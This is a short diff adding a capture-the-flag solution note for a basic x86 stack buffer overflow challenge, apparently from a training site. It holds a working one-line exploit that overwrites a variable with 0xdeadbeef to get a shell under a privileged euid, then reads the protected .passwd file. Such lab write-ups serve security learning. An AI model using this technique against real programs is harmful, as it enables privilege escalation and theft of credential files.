@@ -1,0 +1,8 @@
+ELF x86 - Stack buffer overflow basic 1
+
+cat <(python -c 'print "a"*40 + "\xef\xbe\xad\xde"') - | ./ch13
+(The cat and the '-' are used for keeping the shell open)
+
+id --> show permission of this process (euid=1213(app-sstem-ch13-cracked) is important to get permission for reading .passwd file)
+
+cat .passwd --> <flag>
